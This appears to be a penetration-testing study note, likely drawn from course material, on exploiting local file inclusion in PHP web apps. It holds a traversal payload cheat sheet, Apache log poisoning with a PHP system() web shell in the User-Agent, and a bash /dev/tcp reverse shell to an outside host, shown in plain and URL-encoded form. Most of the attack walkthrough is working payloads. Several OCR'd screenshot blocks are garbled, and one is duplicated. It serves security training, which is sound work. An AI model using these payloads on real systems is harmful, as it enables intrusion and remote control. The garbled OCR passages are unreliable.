---
tags:
  - lfi
  - phase/exploitation
  - rce
  - web
---

# Local file inclusion (LFI)

> [!tip] Quick Reference — LFI
> | Goal | Command / Payload |
> |------|---------|
> | Basic traversal | `?page=../../../../etc/passwd` |
> | Null byte (old PHP) | `?page=../../../../etc/passwd%00` |
> | Log poisoning (Apache) | Poison User-Agent → include `/var/log/apache2/access.log` |
> | Log poisoning (SSH) | Poison SSH username → include `/var/log/auth.log` |
> | /proc/self/environ | `?page=../../../../proc/self/environ` |
> | PHP filter base64 | `?page=php://filter/convert.base64-encode/resource=index.php` |

## Decision Tree

```
Parameter includes a file? (page=, file=, template=, lang= etc)
├── Test basic traversal
│   └── ?page=../../../../etc/passwd
│       ├── Passwd visible → LFI confirmed
│       └── Not visible → try more ../../../ or encoding
│
├── LFI confirmed — go for RCE via Log Poisoning
│   ├── Find accessible log file
│   │   ├── /var/log/apache2/access.log  (most common)
│   │   ├── /var/log/apache2/error.log
│   │   ├── /var/log/auth.log            (SSH logs)
│   │   └── /proc/self/environ
│   ├── Poison the log
│   │   └── curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/
│   └── Execute via LFI
│       └── ?page=../../../../var/log/apache2/access.log&cmd=id
│
├── No log access? Try PHP wrappers
│   ├── php://filter → read source code (base64)
│   └── data:// → embed payload directly (needs allow_url_include)
│
└── Got RCE? Get a shell
    └── ?page=...&cmd=bash -c 'bash -i >%26 /dev/tcp/<LHOST>/4444 0>%261'
```

## Common Log Paths
| OS | Log |
|----|-----|
| Debian/Ubuntu | `/var/log/apache2/access.log` |
| CentOS/RHEL | `/var/log/httpd/access_log` |
| Any Linux | `/var/log/auth.log`, `/proc/self/environ` |
| Windows IIS | `C:\inetpub\logs\LogFiles\W3SVC1\` |

## Resources
- [HackTricks — LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PayloadsAllTheThings — LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)


Before we examine Local File Inclusion (LFI), let's take a moment to explore the differences between File Inclusion and Directory Traversal. These two concepts often get mixed up by penetration testers and security professionals. If we confuse the type of vulnerability we find, we may miss an opportunity to obtain code execution.

As covered in the last Learning Unit, we can use directory traversal vulnerabilities to obtain the contents of a file outside of the web server's web root. File inclusion vulnerabilities allow us to "include" a file in the application's running code. This means we can use file inclusion vulnerabilities to execute local or remote files, while directory traversal only allows us to read the contents of a file. Since we can include files in the application's running code with file inclusion vulnerabilities, we can also display the file contents of non-executable files. For example, if we leverage a directory traversal vulnerability in a PHP web application and specify the file admin.php, the source code of the PHP file will be displayed. On the other hand, when dealing with a file inclusion vulnerability, the admin.php file will be executed instead.

In the following example, our goal is to obtain Remote Code Execution (RCE) via an LFI vulnerability. We will do this with the help of Log Poisoning. Log Poisoning works by modifying data we send to a web application so that the logs contain executable code. In an LFI vulnerability scenario, the local file we include is executed if it contains executable content. This means that if we manage to write executable code to a file and include it within the running code, it will be executed.

> [!note]- Screenshot
> ```
> In the following case study, we will try to write executable code
> to Apache's access.log file in the /var/log/apache2/ directory.
> We'll first need to review what information is controlled by us and
> saved by Apache in the related log. In this case, "controlled"
> means that we can modify the information before we send it to
> the web application. We can either read the Apache web server
> documentation or display the file via LFI.
> Let's use curl to analyze which elements comprise a log entry by
> displaying the file access.log using the previously found
> directory traversal vulnerability. This means we'll use the relative
> path of the log file in the vulnerable "page" parameter in the
> “Mountain Desserts" web application.
> 
> kaligkali:~§ curl http://mountaindesserts .com/meteor/index.php?
> 
> page=. /ee/ee/ee/ee/ee/++/++/«+/var/ log/apache2/access .1og
> 
> 192.168.50.1 - - [12/Apr/222:10:34:55 +0080] “GET /meteor/inde
> 
> x.php?page=admin. php HTTP/1.1" 200 2218 "-" “Mozilla/5.0 (x13
> 
> Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
> 
> Listing 13 - Log entry of Apache's access.log
> ```


> [!note]- Screenshot
> ```
> Let's start Burp, open the browser, and navigate to the "Mountain
> Desserts" web page. We'll click on the Admin link at the bottom
> of the page, then switch back to Burp and click on the HTTP
> history tab. Let's select the related request and send it to
> Repeater.
> Seen = ment Dna :
> Figure 8: Unmodified Request in Burp Repeater
> We can now modify the User Agent to include the PHP code
> snippet of the following listing. This snippet accepts a command
> via the cmd parameter and executes it via the PHP system
> function on the target system. We'll use echo to display
> command output.
> <2php echo system($_GET["cmd"]); 2>
> Listing 14 - PHP Snippet to embed in the User Agent
> ```

<?php echo system($_GET['cmd']); ?>

> [!note]- Screenshot
> ```
> After modifying the User Agent, let's click Send.
> Request
> Hex n=
> 
> 1 GET /meteor/index.php?7page=adnin.php HTTP/L.1
> 
> Host: mountaindesserts.con
> 
> \ nt: Nozilla/5.0 <Zphp echo system($ GET{'cnd"]); 2>
> 4 Accept:
> 
> text/html ,appLication/xhtml+xml ,application/xml ;q=.9,image/webp,*/*;q=
> 
> 5 Accept-Language: en-US,en;q=0.5,
> 
> 6 Accept-Encoding: gzip, deflate
> 
> close
> Upara ts: 1
> Figure 9: Modified Request in Burp Repeater
> ```


> [!note]- Screenshot
> ```
> The PHP code snippet was written to Apache's access.log file.
> 
> By including the log file via the LFI vulnerability, we can execute
> 
> the PHP code snippet.
> 
> To execute our snippet, we'll first update the page parameter in
> 
> the current Burp request with a relative path.
> 
> clade Dele L od. -1 1 -1ar/log/apache2/access.1og
> Listing 15 - Relative Path for the “page" parameter
> ```


> [!note]- Screenshot
> ```
> We also need to add the cmd parameter to the URL to enter a
> command for the PHP snippet. First, let's enter the ps command
> to verify that the log poisoning is working. Since we want to
> provide values for the two parameters (page for the relative path
> of the log and cmd for our command), we can use an ampersand
> (&) as a delimiter. We'll also remove the User Agent line from the
> current Burp request to avoid poisoning the log again, which
> would lead to multiple executions of our command due to two
> PHP snippets included in the log.
> The final Burp request is shown in the Request section of the
> following Figure. After sending our request, let's scroll down and
> review the output in the Response section.
> TT
> Figure 10: Output of the specified Is a, EA
> Figure 10 shows the output of the executed ps command that
> was written to the access.log file due to our poisoning with the
> PHP code snippet.
> ```


> [!note]- Screenshot
> ```
> Let's update the command parameter with Is -la.
> Seo © oan :
> Figure 11: Using a command with parameters
> 
> The output in the Response section shows that our input triggers
> an error. This happens due to the space between the command
> and the parameters. There are different techniques we can use to
> bypass this limitation, such as using /nput Field Separators (IFS)
> or URL encoding. With IFS, we can change how a space is
> interpreted. as shown here:
> 
> IFS="‘ # Set IFS to space
> 
> input="cat /etc/passwd”
> 
> read -r cmd arg <<< “$input™
> 
> $cmd $arg
> 
> Listing 16 - IFS Example
> ```


> [!note]- Screenshot
> ```
> This takes the string and splits it based on the IFS. We can then
> run those commands without using the space character. With
> URL encoding, a space is represented as "%20". Let's do that
> now.
> Let's replace the space with "%20" and press Send.
> 
> Figure 12: URL encoding a space with %20
> Figure 12 shows that our command executed correctly.
> ```


> [!note]- Screenshot
> ```
> Let's attempt to obtain a reverse shell by adding a command to
> the cmd parameter. We can use a common Bash TCP reverse
> shell one-liner. The target IP for the reverse shell may need to be
> updated in the labs.
> bash -i >& /dev/tcp/192.168.119.3/4444 @>&1
> Listing 17 - Bash reverse shell one-liner
> ```

bash -i >& /dev/tcp/192.168.119.3/4444 0>&1

> [!note]- Screenshot
> ```
> Since we'll execute our command through the PHP system
> function, we should be aware that the command may be
> executed via the Bourne Shell, also known as sh, rather than
> Bash. The reverse shell one-liner in Listing 17 contains syntax
> that is not supported by the Bourne Shell. To ensure the reverse
> shell is executed via Bash, we need to modify the reverse shell
> command. We can do this by providing the reverse shell one-liner
> as argument to bash -c, which executes a command with Bash.
> 
> | bash -c “bash -i >& /dev/tcp/192.168.119.3/4444 @>&1"
> "Listing 18 - Bash reverse shell one-liner executed as command in Bash
> ```

bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

> [!note]- Screenshot
> ```
> We'll once again encode the special characters with URL
> encoding.
> bash%20-c%20%22bash%20- i%20%3E%26%20%2F devE2F tcp%2F192.168.119.
> BR2FA444%200%3EX261%22
> Listing 19 - URL encoded Bash TCP reverse shell one-liner
> ```

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22

> [!note]- Screenshot
> ```
> The following figure shows the correct way to add our command
> in the request:
> Request
> Hox n=
> GET /meteor/index .php?page=
> Delelelerl vd ve] ve] »/Nar/og/apache2/access. Logscnd=
> bash's20 -c&26%22bash¥20 - i620%SEL2EL2O%ZF devii2F tcp¥2F192.168.119.3%2F44
> 44%5200%3E%261%22 HTTP/1.1
> mountaindesserts.com
> Accor
> text/html ,application/xhtml+xml , application/xnl ;q=8.9, image/webp,*/*;
> q=0.8
> 4 Accept -Language: en-US,en;q=9.5
> 5 Accept-Encoding: gzip, deflate
> don: close
> grade- I ts: 1
> Figure 13: Encoded Bash reverse shell in "cmd" parameter
> ```


> [!note]- Screenshot
> ```
> The following figure shows the correct way to add our command
> in the request:
> Request
> Hox n=
> GET /meteor/index .php?page=
> Delelelerl vd ve] ve] »/Nar/og/apache2/access. Logscnd=
> bash's20 -c&26%22bash¥20 - i620%SEL2EL2O%ZF devii2F tcp¥2F192.168.119.3%2F44
> 44%5200%3E%261%22 HTTP/1.1
> mountaindesserts.com
> Accor
> text/html ,application/xhtml+xml , application/xnl ;q=8.9, image/webp,*/*;
> q=0.8
> 4 Accept -Language: en-US,en;q=9.5
> 5 Accept-Encoding: gzip, deflate
> don: close
> grade- I ts: 1
> Figure 13: Encoded Bash reverse shell in "cmd" parameter
> ```


> [!note]- Screenshot
> ```
> Before moving to the next section, let's briefly explore LFI attacks
> on Windows targets. Exploiting LFl on Windows only differs from
> Linux when it comes to file paths and code execution. The PHP.
> code snippet we used in this section for Linux also works on
> Windows, since we use the PHP system function that is
> independent from the underlying operating system. When we usé
> Log Poisoning on Windows, we should understand that the log
> files are in application-specific paths. For example, on a target
> running XAMPP, the Apache logs can be found in
> C:\xampp\apache\logs\.
> 
> Exploiting File Inclusion vulnerabilities depends heavily on the
> web application's programming language, the version, and the
> web server configuration. Outside PHP, we can also leverage LFI
> and RFI vulnerabilities in other frameworks or server-side
> scripting languages including:
> 
> © Perl
> 
> * Active Server Pages Extended
> 
> « Active Server Pages
> 
> « Java Server Pages
> 
> Exploiting these kinds of vulnerabilities is very similar across
> these languages.
> ```

---
%% graph-links %%
## Related
- [[Remote file inclusion (RFI)]]
- [[PHP wrappers]]
- [[Identifying and exploiting directory traversals]]
- [[Command Injection]]

> [!info] Navigation
> Section: [[Web Applications/Common Web Application Attacks/File Inclusion Vulnerabilities/_index|File Inclusion Vulnerabilities]] · Home: [[🏠 Home]]

